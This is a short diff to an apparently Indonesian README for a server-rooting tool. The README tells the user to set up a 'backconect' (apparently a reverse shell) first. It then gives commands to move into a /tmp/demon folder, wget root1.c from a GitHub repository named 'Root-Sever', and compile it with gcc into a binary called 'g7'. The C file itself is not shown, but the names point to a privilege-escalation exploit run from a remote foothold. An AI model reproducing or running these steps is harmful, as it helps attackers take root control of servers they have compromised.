@@ -2,6 +2,12 @@
 sebelum pakai pastikan backconect terlebih dahulu
 lalu compile file nya 
 # comand nya
+cd /tmp
+<br>
+mkdir demon
+<br>
+cd demon
+<br>
 wget https://raw.githubusercontent.com/ganest-seven/Root-Sever/main/root1.c 
 <br>
 gcc -pthread root1.c -o g7 -lcrypt
